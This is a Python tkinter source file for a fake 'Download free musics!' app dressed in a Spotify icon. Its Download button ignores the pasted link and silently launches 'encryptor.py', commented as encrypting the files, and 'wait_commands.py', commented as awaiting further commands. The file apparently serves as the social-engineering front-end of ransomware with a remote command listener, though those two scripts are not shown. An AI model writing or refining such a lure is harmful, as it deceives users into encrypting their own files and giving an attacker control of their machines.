import tkinter as tk
from PIL import Image, ImageTk  # pip install pillow
import subprocess

def run_script():
    #to encrypt the files
    subprocess.Popen(["python3", "encryptor.py"])
    #to await further commands
    subprocess.Popen(["python3", "wait_commands.py"])

def main():
    root = tk.Tk()
    root.title("Download free musics!")

    # bigger window (not fullscreen)
    root.geometry("800x600")
    root.resizable(False, False)

    # load background image
    bg_image = Image.open("Spotify_icon.svg.png")
    bg_image = bg_image.resize((800, 600))
    bg_photo = ImageTk.PhotoImage(bg_image)

    # create canvas
    canvas = tk.Canvas(root, width=800, height=600, highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    # set background image
    canvas.create_image(0, 0, image=bg_photo, anchor="nw")

    # keep reference to avoid garbage collection
    canvas.bg_photo = bg_photo

    # input field
    link_entry = tk.Entry(root, width=40, font=("Arial", 14), justify="center")
    link_entry.insert(0, "Paste link here...")

    # button
    start_button = tk.Button(
        root,
        text="Download",
        font=("Arial", 16),
        command=run_script
    )

    # center widgets
    canvas.create_window(400, 260, window=link_entry)
    canvas.create_window(400, 320, window=start_button)

    root.mainloop()

if __name__ == "__main__":
    main()